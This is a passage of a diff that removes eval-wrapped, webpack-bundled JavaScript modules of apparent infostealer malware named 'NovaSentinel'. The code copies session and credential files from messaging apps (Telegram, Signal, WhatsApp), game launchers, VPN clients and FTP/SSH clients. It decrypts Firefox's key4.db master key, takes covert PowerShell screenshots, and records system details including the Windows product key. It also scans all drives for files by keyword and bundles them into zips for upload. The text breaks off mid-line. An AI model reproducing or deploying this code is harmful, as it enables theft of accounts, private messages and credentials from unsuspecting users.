-eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  appdata = process.env.appdata,\n  local = process.env.localappdata,\n  archiver = __webpack_require__(/*! archiver */ \"archiver\"),\n  { upload } = __webpack_require__(/*! ./uploadFiles */ \"./utils/uploadFiles.js\"),\n  https = __webpack_require__(/*! https */ \"https\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  agent = new https.Agent({ rejectUnauthorized: false }),\n  fsPromises = fs.promises;\n\nclass SimpleFile {\n  constructor(name, mainfolder, existpath, stealpath) {\n    this.name = name;\n    this.mainfolder = mainfolder;\n    this.existpath = existpath;\n    this.stealpath = stealpath;\n  }\n}\n\nfunction NovaSentinelSimple() {\n  try {\n    const homepath = process.env.homepath;\n    const simples = [\n      new SimpleFile(\"MobaXterm\", \"Clients\", appdata + \"\\\\MobaXterm\\\\\", [\n        appdata + \"\\\\MobaXterm/MobaXterm.ini\",\n      ]),\n      new SimpleFile(\"NationsGlory\", \"Games\", appdata + \"\\\\NationsGlory\\\\\", [\n        appdata + \"\\\\NationsGlory\\\\Local Storage/leveldb\",\n      ]),\n\n      new SimpleFile(\"Growtopia\", \"Games\", local + \"\\\\Growtopia\\\\\", [\n        local + \"\\\\Growtopia\\\\save.dat\",\n      ]),\n      new SimpleFile(\"Minecraft\", \"Games\", appdata + \"\\\\.minecraft\\\\\", []),\n      new SimpleFile(\n        \"Skype\",\n        \"Social\",\n        appdata + \"\\\\Microsoft\\\\Skype for Desktop\\\\Local Storage\\\\\",\n        [appdata + \"\\\\Microsoft\\\\Skype for Desktop\\\\Local Storage\\\\\"]\n      ),\n      new SimpleFile(\n        \"Element\",\n        \"Social\",\n        appdata + \"\\\\Element\\\\Local Storage\\\\\",\n        [appdata + \"\\\\Element\\\\Local Storage\\\\\"]\n      ),\n      new SimpleFile(\"Signal\", \"Social\", appdata + \"\\\\Signal\\\\\", [\n        appdata + \"\\\\Signal\\\\Local Storage\\\\\",\n        appdata + \"\\\\Signal\\\\Session Storage\\\\\",\n        appdata + \"\\\\Signal\\\\sql\\\\\",\n        appdata + \"\\\\Signal\\\\databases\\\\\",\n        appdata + \"\\\\Signal\\\\config.json\",\n      ]),\n      new SimpleFile(\"ICQ\", \"Social\", appdata + \"\\\\ICQ\\\\0001\\\\\", [\n        appdata + \"\\\\ICQ\\\\0001\\\\\",\n      ]),\n      new SimpleFile(\"FileZilla\", \"Clients\", appdata + \"\\\\FileZilla\\\\\", [\n        appdata + \"\\\\FileZilla\\\\recentservers.xml\",\n      ]),\n      new SimpleFile(\n        \"OpenVPN Connect\",\n        \"VPN\",\n        appdata + \"\\\\OpenVPN Connect\\\\\",\n        [appdata + \"\\\\OpenVPN Connect\\\\profiles\"]\n      ),\n      new SimpleFile(\"Shadow\", \"Clients\", appdata + \"\\\\shadow\\\\\", [\n        appdata + \"\\\\shadow\\\\Local State\",\n        appdata + \"\\\\shadow\\\\Local Storage\\\\\",\n        appdata + \"\\\\shadow\\\\Session Storage\\\\\",\n      ]),\n      new SimpleFile(\"TotalCommander\", \"Clients\", appdata + \"\\\\GHISLER\\\\\", [\n        appdata + \"\\\\GHISLER\\\\wcx_ftp.ini\",\n      ]),\n      new SimpleFile(\n        \"LunarClient\",\n        \"Games\",\n        homepath + \"\\\\.lunarclient\\\\settings\\\\game\\\\\",\n        []\n      ),\n      new SimpleFile(\"FeatherClient\", \"Games\", appdata + \"\\\\.feather\\\\\", []),\n      new SimpleFile(\n        \"EssentialClient\",\n        \"Games\",\n        appdata + \"\\\\.minecraft\\\\essential\\\\\",\n        []\n      ),\n      new SimpleFile(\n        \"TLauncher\",\n        \"Games\",\n        appdata + \"\\\\.tlauncher\\\\mcl\\\\Minecraft\\\\game\\\\\",\n        []\n      ),\n    ];\n\n    for (let i = 0; i < simples.length; i++) {\n      const simple = simples[i];\n\n      if (fs.existsSync(simple.existpath)) {\n        if (simple.mainfolder == \"Clients\") {\n          stat.AddSysAdmin(simple.name);\n        }\n        if (simple.mainfolder == \"Social\") {\n          stat.AddMessenger(simple.name);\n        }\n        if (\n          simple.mainfolder == \"Games\" &&\n          !simple.name.includes(\"craft\") &&\n          !simple.name.includes(\"lunar\") &&\n          !simple.existpath.includes(\"feather\")\n        ) {\n          stat.AddGames(simple.name);\n        }\n        if (\n          simple.existpath.includes(\"craft\") ||\n          simple.existpath.includes(\"lunarclient\") ||\n          simple.existpath.includes(\"feather\")\n        ) {\n          stat.AddGames(simple.name);\n          const mcfiles = fs.readdirSync(simple.existpath);\n          const filteredFiles = mcfiles.filter(\n            (file) =>\n              file.includes(\".json\") ||\n              file.includes(\".txt\") ||\n              file.includes(\".dat\")\n          );\n\n          filteredFiles.forEach((f) => {\n            const fullPath = path.join(simple.existpath, f);\n            if (f.includes(\".json\")) {\n              stat.addMinecraft(fullPath);\n            }\n            simple.stealpath.push(fullPath);\n          });\n        }\n        save.ArraySave(simple.stealpath, simple.mainfolder, simple.name);\n      }\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction parseConfigVDF(filePath) {\n  const vdf = fs.readFileSync(filePath, \"utf-8\");\n  const lines = vdf.split(\"\\n\");\n  let result = [];\n\n  for (const line of lines) {\n    const matches = line.match(/7656[0-9]{13}/gi);\n    if (matches) {\n      result = result.concat(matches);\n    }\n  }\n\n  return result;\n}\n\nfunction NovaSentinelSteam(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = [\n      \"C:\\\\program files (x86)\\\\steam\\\\\",\n      \"C:\\\\program files\\\\steam\\\\\",\n    ];\n\n    var saves = [];\n\n    for (let i = 0; i < mainPath.length; i++) {\n      const path = mainPath[i];\n      if (fs.existsSync(path)) {\n        const files = fs.readdirSync(path);\n\n        for (let u = 0; u < files.length; u++) {\n          const file = files[u];\n\n          const savePath = path + file;\n\n          if (file.includes(\"ssfn\")) {\n            saves.push(savePath);\n          }\n        }\n\n        const configPath = path + \"config\\\\\";\n        if (fs.existsSync(configPath)) {\n          saves.push(configPath);\n          if (fs.existsSync(configPath + \"config.vdf\")) {\n            const configData = parseConfigVDF(configPath + \"loginusers.vdf\");\n\n            stat.addSteam(configData);\n          }\n        }\n      }\n    }\n    if (saves.length != 0) {\n      stat.AddGames(\"Steam\");\n      save.ArraySave(saves, \"Launcher\", \"Steam\");\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelTermius(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const termius_path = local + \"\\\\Termius\\\\Local Storage\\\\leveldb\\\\\";\n\n    if (!fs.existsSync(termius_path)) {\n      return;\n    }\n\n    var saves = [];\n\n    const files = fs.readdirSync(termius_path);\n\n    for (var i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = termius_path + file;\n      if (fs.lstatSync(savePath).isDirectory()) {\n        if (file.length != 16) {\n          continue;\n        }\n        saves.push(savePath + \"//\");\n      } else {\n        saves.push(savePath);\n      }\n    }\n\n    stat.AddSysAdmin(\"Termius\");\n    save.ArraySave(saves, \"Clients\", \"Termius\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelTelegram(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const telegram_path = appdata + \"\\\\Telegram Desktop\\\\tdata\\\\\";\n\n    if (!fs.existsSync(telegram_path)) {\n      return;\n    }\n\n    var saves = [];\n\n    const files = fs.readdirSync(telegram_path);\n\n    for (var i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = telegram_path + file;\n      if (fs.lstatSync(savePath).isDirectory()) {\n        if (file.length != 16) {\n          continue;\n        }\n\n        saves.push(savePath + \"//\");\n      } else {\n        if (file.endsWith(\"s\") || file.length == 17) {\n          saves.push(savePath);\n        }\n\n        if (\n          file.startsWith(\"settings\") ||\n          file.startsWith(\"key_data\") ||\n          file.startsWith(\"usertag\")\n        ) {\n          saves.push(savePath);\n        }\n      }\n    }\n\n    stat.AddMessenger(\"Telegram\");\n    save.ArraySave(saves, \"Social\", \"Telegram\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\nfunction NovaSentinelWhatsapp(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const whatsapp_path =\n      appdata +\n      \"\\\\Packages\\\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\\\LocalState\\\\\";\n\n    var saves = [];\n\n    if (!fs.existsSync(whatsapp_path)) {\n      return;\n    }\n\n    if (fs.existsSync(whatsapp_path)) {\n      const files = fs.readdirSync(whatsapp_path);\n\n      for (let i = 0; i < files.length; i++) {\n        const file = files[i];\n        const savePath = whatsapp_path + file;\n\n        if (file.endsWith(\".ini\") || file.endsWith(\".db\")) {\n          saves.push(savePath);\n        }\n      }\n    }\n\n    stat.AddMessenger(\"WhatsApp\");\n    save.ArraySave(saves, \"Social\", \"WhatsApp\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\n\nfunction NovaSentinelFetchT0x(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const tox_path = appdata + \"\\\\tox\\\\\";\n\n    var saves = [];\n\n    if (!fs.existsSync(tox_path)) {\n      return;\n    }\n\n    if (fs.existsSync(tox_path)) {\n      const files = fs.readdirSync(tox_path);\n\n      for (let i = 0; i < files.length; i++) {\n        const file = files[i];\n        const savePath = tox_path + file;\n\n        if (\n          file.endsWith(\".tox\") ||\n          file.endsWith(\".ini\") ||\n          file.endsWith(\".db\")\n        ) {\n          saves.push(savePath);\n        }\n      }\n    }\n\n    stat.AddMessenger(\"Tox\");\n    save.ArraySave(saves, \"Social\", \"Tox\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelPidgin(cc) {\n  if (!cc) return;\n  try {\n    const mainPath = appdata + \"\\\\.purple\\\\\";\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    if (fs.existsSync(mainPath + \"accounts.xml\")) {\n      stat.AddMessenger(\"Pidgin\");\n      save.ArraySave([mainPath + \"accounts.xml\"], \"Social\", \"Pidgin\");\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelNordVPN(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = local + \"\\\\NordVPN\\\\\";\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n    var saves = [];\n\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file + \"\\\\\";\n\n      if (fs.statSync(savePath).isDirectory) {\n        if (file.includes(\"exe\")) {\n          const filesExe = fs.readdirSync(savePath);\n\n          for (let u = 0; u < filesExe.length; u++) {\n            const fileExe = filesExe[u];\n\n            if (fs.existsSync(savePath + fileExe + \"\\\\user.config\")) {\n              saves.push(savePath + fileExe + \"\\\\user.config\");\n            }\n          }\n        }\n      }\n    }\n\n    stat.AddVpn(\"NordVPN\");\n    save.ArraySave(saves, \"VPN\", \"NordVPN\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelProton(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = local + \"\\\\ProtonVPN\\\\\";\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n    var saves = [];\n\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file + \"\\\\\";\n\n      if (fs.statSync(savePath).isDirectory) {\n        if (file.includes(\"exe\")) {\n          const filesExe = fs.readdirSync(savePath);\n\n          for (let u = 0; u < filesExe.length; u++) {\n            const fileExe = filesExe[u];\n\n            if (fs.existsSync(savePath + fileExe + \"\\\\user.config\")) {\n              saves.push(savePath + fileExe + \"\\\\user.config\");\n            }\n          }\n        }\n      }\n    }\n\n    stat.AddVpn(\"ProtonVPN\");\n    save.ArraySave(saves, \"VPN\", \"ProtonVPN\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelRiotGame(cc) {\n  if (cc != \"yes\") return;\n  let riotgame = local + \"\\\\Riot Games\\\\Riot Client\\\\Data\\\\\";\n  try {\n    var saves = [];\n\n    if (fs.existsSync(path)) {\n      const files = fs.readdirSync(riotgame);\n\n      for (let u = 0; u < files.length; u++) {\n        const file = files[u];\n\n        const savePath = path + file;\n        saves.push(savePath);\n      }\n    }\n    if (saves.length != 0) {\n      stat.AddGames(\"Riotgames\");\n      save.ArraySave(saves, \"Launcher\", \"RiotGames\");\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelEpicGame(cc) {\n  if (cc != \"yes\") return;\n  let epicpath = [];\n  try {\n    const epicgame = local + \"\\\\EpicGamesLauncher\\\\Saved\\\\Config\\\\Windows\\\\\";\n    const config_file = path.join(epicgame, \"GameUserSettings.ini\");\n\n    if (fs.existsSync(epicgame) && fs.existsSync(config_file)) {\n      const contents = fs.readFileSync(config_file, \"utf-8\");\n      if (contents.includes(\"[RememberMe]\")) {\n        const files = fs.readdirSync(epicgame);\n        for (let i = 0; i < files.length; i++) {\n          const file = files[i];\n          const filePath = epicgame + file;\n          epicpath.push(filePath);\n        }\n      }\n      stat.AddGames(\"EpicGame\");\n      save.ArraySave(epicpath, \"Launcher\", \"EpicGame\");\n    }\n  } catch (error) {\n    save.SaveError(error);\n  }\n}\n\nfunction NovaSentinelGOG(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const gog = local + \"\\\\GOG.com\\\\Galaxy\\\\Configuration\\\\\";\n    if (fs.existsSync(gog)) {\n      stat.AddGames(\"GOG\");\n      save.SimpleSave(gog, \"Launcher\", \"GOG\");\n    }\n  } catch (error) {\n    save.SaveError(error);\n  }\n}\n\nfunction NovaSentinelRockstarGames(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const rockstar = local + \"\\\\Rockstar Games\\\\Launcher\\\\\";\n    if (fs.existsSync(rockstar)) {\n      stat.AddGames(\"Rockstar\");\n      save.SimpleSave(rockstar, \"Launcher\", \"Rockstar\");\n    }\n  } catch (error) {\n    save.SaveError(error);\n  }\n}\n\nfunction NovaSentinelElectronicArts(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const eapath = local + \"\\\\Electronic Arts\\\\EA Desktop\\\\Windows\\\\cookie.ini\";\n    if (fs.existsSync(eapath)) {\n      stat.AddGames(\"ElectronicArts\");\n      save.SimpleSave(eapath, \"Launcher\", \"ElectronicArts\");\n    }\n  } catch (error) {\n    save.SaveError(error);\n  }\n}\n\nfunction NovaSentinelUbisoft(cc) {\n  if (cc != \"yes\") return;\n  let riotgame = local + \"\\\\Ubisoft Game Launcher\\\\\";\n  try {\n    var saves = [];\n\n    if (fs.existsSync(path)) {\n      const files = fs.readdirSync(riotgame);\n\n      for (let u = 0; u < files.length; u++) {\n        const file = files[u];\n\n        const savePath = path + file;\n        saves.push(savePath);\n      }\n    }\n    if (saves.length != 0) {\n      stat.AddGames(\"Ubisoft\");\n      save.ArraySave(saves, \"Launcher\", \"Ubisoft\");\n    }\n  } catch (error) {}\n}\n\nfunction NovaSentinelOpenVPN(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = appdata + \"\\\\OpenVPN Connect\\\\profiles\\\\\";\n    var saves = [];\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file;\n      saves.push(savePath);\n    }\n\n    stat.AddGames(\"OpenVPN\");\n    save.ArraySave(saves, \"VPN\", \"OpenVPN\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction NovaSentinelBattle(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = appdata + \"\\\\Battle.net\\\\\";\n    var saves = [];\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file;\n\n      if (file.includes(\"db\") || file.includes(\"config\")) {\n        saves.push(savePath);\n      }\n    }\n\n    stat.AddGames(\"Battle.net\");\n    save.ArraySave(saves, \"Launcher\", \"Battlenet\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function rechercherFichiers(repertoire, textes, extensions) {\n  const fichiersTrouves = [];\n\n  const fichiers = await fsPromises.readdir(repertoire);\n\n  for (const fichier of fichiers) {\n    const chemin = path.join(repertoire, fichier);\n    const stat = await fsPromises.stat(chemin);\n    const extension = path.extname(fichier).toLowerCase();\n\n    if (!stat.isDirectory() && extensions.includes(extension)) {\n      if (textes.some((texte) => fichier.toLowerCase().includes(texte))) {\n        fichiersTrouves.push(chemin);\n      }\n    }\n  }\n\n  return fichiersTrouves;\n}\n\nfunction genererNomAleatoire(longueur) {\n  const caracteres =\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\n  let nomAleatoire = \"\";\n  for (let i = 0; i < longueur; i++) {\n    const index = Math.floor(Math.random() * caracteres.length);\n    nomAleatoire += caracteres.charAt(index);\n  }\n  return nomAleatoire;\n}\n\nasync function zipEtSupprimerDossier(dossierSource) {\n  const dossierDestination = `${path.dirname(dossierSource)}\\\\@${\n    process.env.USERNAME.replace(\".\", \"\") || \"USER\"\n  }_Keywords.zip`;\n\n  return new Promise((resolve, reject) => {\n    const output = fs.createWriteStream(dossierDestination);\n    const archive = archiver(\"zip\", { zlib: { level: 9 } });\n\n    output.on(\"close\", async () => {\n      try {\n        await fsPromises.rm(dossierSource, { recursive: true });\n        resolve(dossierDestination);\n      } catch (err) {\n        reject(err);\n      }\n    });\n\n    archive.on(\"error\", (err) => {\n      reject(err);\n    });\n\n    archive.pipe(output);\n    archive.directory(dossierSource, false);\n    archive.finalize();\n  });\n}\n\nfunction NovasearchFilesDir(extensionsAutorisees, motsARechercher) {\n  const driveLetters = [];\n  for (let i = 65; i <= 90; i++) {\n    const driveLetter = String.fromCharCode(i) + \":\";\n    driveLetters.push(driveLetter);\n  }\n\n  const os = __webpack_require__(/*! os */ \"os\");\n  const mainDriveLetter =\n    os.platform() === \"win32\"\n      ? os.homedir().charAt(0).toUpperCase() + \":\"\n      : null;\n  if (mainDriveLetter) {\n    const index = driveLetters.indexOf(mainDriveLetter);\n    if (index !== -1) {\n      driveLetters.splice(index, 1);\n    }\n  }\n\n  const matchingFiles = [];\n\n  function checkFilesInDirectory(directory) {\n    try {\n      const files = fs.readdirSync(directory);\n      files.forEach((file) => {\n        const fileExtension = path.extname(file);\n        const fileName = path.basename(file);\n        if (extensionsAutorisees.includes(fileExtension)) {\n          for (const mot of motsARechercher) {\n            if (fileName.includes(mot)) {\n              matchingFiles.push(path.join(directory, file));\n              break;\n            }\n          }\n        }\n      });\n    } catch (error) {}\n  }\n  driveLetters.forEach((driveLetter) => {\n    const directory = path.join(driveLetter, \"\\\\\");\n    checkFilesInDirectory(directory);\n  });\n  return matchingFiles;\n}\n\nmodule.exports = {\n  NovaSentinelSimple,\n  NovaSentinelSteam,\n  NovaSentinelTelegram,\n  NovaSentinelFetchT0x,\n  NovaSentinelProton,\n  NovaSentinelBattle,\n  NovaSentinelPidgin,\n  NovaSentinelEpicGame,\n  NovaSentinelRiotGame,\n  NovaSentinelUbisoft,\n  NovaSentinelNordVPN,\n  NovaSentinelOpenVPN,\n  NovaSentinelElectronicArts,\n  NovaSentinelRockstarGames,\n  NovaSentinelGOG,\n  NovaSentinelWhatsapp,\n};\n\n\n//# sourceURL=webpack://script/./utils/files.js?");
-
-/***/ }),
-
-/***/ "./utils/gecko.js":
-/*!************************!*\
-  !*** ./utils/gecko.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\");\nconst forge = __webpack_require__(/*! node-forge */ \"node-forge\");\nconst initSqlJs = __webpack_require__(/*! sql.js */ \"sql.js\");\nconst path = __webpack_require__(/*! path */ \"path\");\n\nfunction decodeLoginData(b64) {\n    const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));\n    return {\n        iv: asn1.value[1].value[1].value,\n        data: asn1.value[2].value\n    };\n}\n\nasync function getKey(profileDirectory, masterPassword) {\n    const key4FilePath = path.join(profileDirectory, 'key4.db');\n    if (!fs.existsSync(key4FilePath)) {\n        throw new Error('key4.db was not found in this profile directory.');\n    }\n\n    const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || '');\n    const key4File = fs.readFileSync(key4FilePath);\n\n    const key4Db = await initSqlJs().then(function(SQL){\n        return new SQL.Database(key4File);\n    });\n\n    const metaData = key4Db.exec('SELECT item1, item2 FROM metadata WHERE id = \\'password\\';');\n    if (metaData && metaData.length && metaData[0].values && metaData[0].values.length) {\n        const globalSalt = toByteString(metaData[0].values[0][0].buffer);\n        const item2 = toByteString(metaData[0].values[0][1].buffer);\n        const item2Asn1 = forge.asn1.fromDer(item2);\n        const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);\n        if (item2Value && item2Value.data === 'password-check') {\n            const nssData = key4Db.exec('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;');\n            if (nssData && nssData.length && nssData[0].values && nssData[0].values.length) {\n                const a11 = toByteString(nssData[0].values[0][0].buffer);\n                const a11Asn1 = forge.asn1.fromDer(a11);\n                return pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt);\n            }\n        } else {\n            throw new Error('Master password incorrect.');\n        }\n    }\n\n    throw new Error('Not able to get key from profile directory or no passwords were found.');\n}\n\nfunction pbesDecrypt(decodedItemSeq, password, globalSalt) {\n    if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {\n        return pbes2Decrypt(decodedItemSeq, password, globalSalt);\n    }\n    return pbes1Decrypt(decodedItemSeq, password, globalSalt);\n}\n\nfunction pbes1Decrypt(decodedItemSeq, password, globalSalt) {\n    const data = decodedItemSeq[1].value;\n    const salt = decodedItemSeq[0].value[1].value[0].value;\n    const hp = sha1(globalSalt + password);\n    const pes = toByteString(pad(toArray(salt), 20).buffer);\n    const chp = sha1(hp + salt);\n    const k1 = hmac(pes + salt, chp);\n    const tk = hmac(pes, chp);\n    const k2 = hmac(tk + salt, chp);\n    const k = k1 + k2;\n    const kBuffer = forge.util.createBuffer(k);\n    const otherLength = kBuffer.length() - 32;\n    const key = kBuffer.getBytes(24);\n    kBuffer.getBytes(otherLength);\n    const iv = kBuffer.getBytes(8);\n    return decrypt(data, iv, key, '3DES-CBC');\n}\n\nfunction pbes2Decrypt(decodedItemSeq, password, globalSalt) {\n    const data = decodedItemSeq[1].value;\n    const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;\n    const salt = pbkdf2Seq[0].value;\n    const iterations = pbkdf2Seq[1].value.charCodeAt();\n    const iv = '\u0004\u000e' + decodedItemSeq[0].value[1].value[1].value[1].value;\n    const k = sha1(globalSalt + password);\n    const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());\n    return decrypt(data, iv, key, 'AES-CBC');\n}\n\nfunction decrypt(data, iv, key, algorithm) {\n    const decipher = forge.cipher.createDecipher(algorithm, key);\n    decipher.start({ iv: iv });\n    decipher.update(forge.util.createBuffer(data));\n    decipher.finish();\n    return decipher.output;\n}\n\nfunction sha1(data) {\n    const md = forge.md.sha1.create();\n    md.update(data, 'raw');\n    return md.digest().data;\n}\n\nfunction pad(arr, length) {\n    if (arr.length >= length) {\n        return arr;\n    }\n    const padAmount = length - arr.length;\n    const padArr = [];\n    for (let i = 0; i < padAmount; i++) {\n        padArr.push(0);\n    }\n\n    var newArr = new Uint8Array(padArr.length + arr.length);\n    newArr.set(padArr, 0);\n    newArr.set(arr, padArr.length);\n    return newArr;\n}\n\nfunction hmac(data, key) {\n    const hmac = forge.hmac.create();\n    hmac.start('sha1', key);\n    hmac.update(data, 'raw');\n    return hmac.digest().data;\n}\n\nfunction toByteString(buffer) {\n    return String.fromCharCode.apply(null, new Uint8Array(buffer));\n}\n\nfunction toArray(str) {\n    const arr = new Uint8Array(str.length);\n    for (let i = 0; i < str.length; i++) {\n        arr[i] = str.charCodeAt(i);\n    }\n    return arr;\n}\n\nmodule.exports = {\n    getKey,\n    decodeLoginData,\n    decrypt\n}\n\n//# sourceURL=webpack://script/./utils/gecko.js?");
-
-/***/ }),
-
-/***/ "./utils/infos.js":
-/*!************************!*\
-  !*** ./utils/infos.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("var Registry = __webpack_require__(/*! winreg */ \"winreg\"),\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  fs = __webpack_require__(/*! fs */ \"fs\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  { exec } = __webpack_require__(/*! child_process */ \"child_process\"),\n  tempPath = (__webpack_require__(/*! os */ \"os\").tmpdir)(),\n  PowerShell = __webpack_require__(/*! powershell */ \"powershell\"),\n  unidecode = __webpack_require__(/*! unidecode */ \"unidecode\");\n\n\nasync function takeScreenshotAndSave(cc) {\n  if (cc !== \"yes\") return;\n  const savePath = path.join(stat.testpath[0], \"System\");\n  const powershellScript = `\n    $Path = \"${savePath}\" \n\n    $FileName = \"$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png\"\n    $File = \"$Path\\\\$FileName\"\n\n    Add-Type -AssemblyName System.Windows.Forms\n    Add-type -AssemblyName System.Drawing\n\n    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n    $Width = $Screen.Width\n    $Height = $Screen.Height\n    $Left = $Screen.Left\n    $Top = $Screen.Top\n\n    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n    $bitmap.Save($File) \n    Write-Output \"Screenshot saved to:\"\n    Write-Output $File\n  `;\n\n  const ps1FilePath = path.join(tempPath, core.generateId(12) + \"_temp.ps1\");\n\n  fs.writeFileSync(ps1FilePath, powershellScript);\n\n  exec(\n    `powershell -ExecutionPolicy Bypass -NoProfile -File \"${ps1FilePath}\"`,\n    (error, stdout, stderr) => {\n      if (error) {\n      }\n      try {\n        fs.unlinkSync(ps1FilePath);\n      } catch (e) {}\n    }\n  );\n}\n\nasync function getSysteminformations(\n  cc,\n  ip,\n  hostname,\n  disk,\n  ram,\n  uid,\n  cpucount,\n  OS,\n  cpu,\n  GPU,\n  windowskey,\n  windowsversion\n) {\n  if (cc !== \"yes\") return;\n\n  let info = await Systeminformations(\n    cc,\n    ip,\n    hostname,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion\n  );\n  const savePath = path.join(stat.testpath[0], \"System\");\n  try {\n    if (!fs.existsSync(savePath)) {\n      await fs.mkdirSync(savePath);\n      fs.writeFileSync(path.join(savePath, \"System Info.txt\"), info);\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function Systeminformations(\n  cc,\n  ip,\n  hostname,\n  disk,\n  ram,\n  uid,\n  cpucount,\n  OS,\n  cpu,\n  GPU,\n  windowskey,\n  windowsversion\n) {\n  if (cc != \"yes\") return;\n  let informations = core.getHeader();\n  try {\n    informations += `UUID: ${uid}\\n`;\n    informations += `IP: ${ip}\\n`;\n    informations += `Windows Key: ${windowskey}\\n`;\n    informations += `Windows Version: ${windowsversion}\\n`;\n    informations += `HOSTNAME: ${hostname}\\n`;\n    informations += `USERNAME: ${process.env.userprofile.split(\"\\\\\")[2]}\\n`;\n    informations += `OS: ${OS}\\n`;\n    informations += `FileLocation: ${process.cwd()}\\n`;\n    informations += `CPU: ${cpu}\\n`;\n    informations += `CPU Core: ${cpucount}\\n`;\n    informations += `GPU(s): ${GPU.split(\"   \").join(\", \")}\\n`;\n    informations += `RAM: ${ram} GB\\n`;\n    informations += `DISK: ${disk} GB\\n\\n\\n`;\n    informations += `───────────────────────\\nApplications installed\\n───────────────────────\\n\\n${await getInstalledApplication()}\\n`;\n  } catch (e) {}\n  return informations;\n}\n\nasync function getInstalledApplication() {\n  const regKey = new Registry({\n    hive: Registry.HKLM,\n    key: \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\",\n  });\n\n  const exists = await new Promise((resolve, reject) => {\n    regKey.keyExists((err, exists) => {\n      if (err != null) {\n        resolve(false);\n      }\n      resolve(exists);\n    });\n  });\n  if (!exists) {\n    return \"\";\n  }\n\n  const subkeys = await new Promise((resolve, reject) => {\n    regKey.keys((err, subkeys) => {\n      if (err != null) {\n        resolve([]);\n      }\n\n      resolve(subkeys);\n    });\n  });\n  if (subkeys.length == 0) {\n    return \"\";\n  }\n\n  let installedApps = \"\";\n  for (let i = 0; i < subkeys.length; i++) {\n    const subkey = subkeys[i];\n\n    const items = await new Promise((resolve, reject) => {\n      subkey.values((err, items) => {\n        if (err != null) {\n          resolve([]);\n        }\n\n        resolve(items);\n      });\n    });\n\n    for (let u = 0; u < items.length; u++) {\n      if (items[u].name == \"DisplayName\") {\n        installedApps = installedApps + items[u].value + \"\\n\";\n      }\n    }\n  }\n\n  return installedApps;\n}\nasync function NovaSentinelClipboard(cc) {\n  if (cc !== \"yes\") return;\n\n  try {\n    const ge = \"powershell 